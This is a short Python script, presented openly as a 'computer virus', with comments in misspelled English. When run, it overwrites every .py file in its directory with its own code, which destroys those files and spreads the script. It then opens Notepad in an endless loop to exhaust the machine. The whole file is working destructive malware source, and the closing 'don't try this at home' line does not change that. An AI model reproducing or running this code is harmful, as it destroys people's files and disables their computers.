# importing impirtant libarys to create our new python computer virus

import glob
import platform
import os

# finding files which we want to infect

def files_to_infect():
    return glob.glob('*.py')

# getting virus code to cpoy itself to another python files

def get_virus_code():
    file = open(__file__,'r')
    virus = file.read()
    return virus

# copying virus by help of over writing the virus code

def copy_virus(content):
 for files in files_to_infect():
    file = open(files,'w')
    file.write(content)
    file.close()

# calling the functions  to copy the virus and overwriting the content of virus code

def infect():
    copy_virus(get_virus_code())

# slowing down the computer

def crash_computer():
        while True:
            os.system('start Notepad')
    
# finally calling the important functions of virus

def final_virus():
 infect()
 crash_computer()

# calling the function called final virus which will be our new python computer virus

final_virus()

# don't try this at home "A HARMFULL RISK FOR COMPUTER CAN BE HAPPEN"
